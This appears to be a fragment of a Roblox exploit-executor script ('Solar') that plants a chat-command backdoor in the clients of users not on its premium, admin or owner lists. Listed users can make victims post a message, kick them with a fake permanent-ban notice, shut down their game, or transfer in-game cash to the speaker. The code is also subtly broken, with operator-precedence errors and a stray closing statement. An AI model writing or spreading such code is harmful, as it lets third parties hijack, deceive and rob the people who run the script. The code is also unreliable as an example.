local pl, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");
--
task.wait()
if table.find(getgenv().SolarList["Premium"], game.Players.LocalPlayer.Character.Name) or table.find(getgenv().SolarList["Admin"], game.Players.LocalPlayer.Character.Name) or table.find(getgenv().SolarList["Owner"], game.Players.LocalPlayer.Character.Name) then else

onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
local speaker, message = pl[messageData.FromSpeaker], messageData.Message;

if table.find(getgenv().SolarList["Premium"], speaker.Name) or table.find(getgenv().SolarList["Admin"], speaker.Name) or table.find(getgenv().SolarList["Owner"], speaker.Name) and message == "!check" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SolarW", 'All');
elseif table.find(getgenv().SolarList["Premium"], speaker.Name) or table.find(getgenv().SolarList["Admin"], speaker.Name) or table.find(getgenv().SolarList["Owner"], speaker.Name) and message == "!fakeban" then
    game.Players.LocalPlayer:Kick("EXPLOITS DETECTED. YOU HAVE BEEN PERMABANNED!")
elseif table.find(getgenv().SolarList["Premium"], speaker.Name) or table.find(getgenv().SolarList["Admin"], speaker.Name) or table.find(getgenv().SolarList["Owner"], speaker.Name) and message == "!kick" then
    pl.LocalPlayer:Kick("User "..speaker.Name.." has kicked you! please report this if it was abuse! (You were kicked by a Solar Premium user or a Solar Admin/Owner.)");
elseif table.find(getgenv().SolarList["Premium"], speaker.Name) or table.find(getgenv().SolarList["Admin"], speaker.Name) or table.find(getgenv().SolarList["Owner"], speaker.Name) and message == "!crash" then
    game:Shutdown();
elseif table.find(getgenv().SolarList["Premium"], speaker.Name) or table.find(getgenv().SolarList["Admin"], speaker.Name) or table.find(getgenv().SolarList["Owner"], speaker.Name) and message == "!sendcash" then
game:GetService("ReplicatedStorage").Send:FireServer("100", game:GetService("Players"):FindFirstChild(speaker.Name))
end
end);
end;

end;
-- end sl2 premium

--owner in game function (DONT LOOP!)
if table.find(getgenv().SolarList["Premium"], game.Players.LocalPlayer.Character.Name) or table.find(getgenv().SolarList["Admin"], game.Players.LocalPlayer.Character.Name) or table.find(getgenv().SolarList["Owner"], game.Players.LocalPlayer.Character.Name) then
getgenv().hasPremium = true
end
pcall(ownerNotifier)
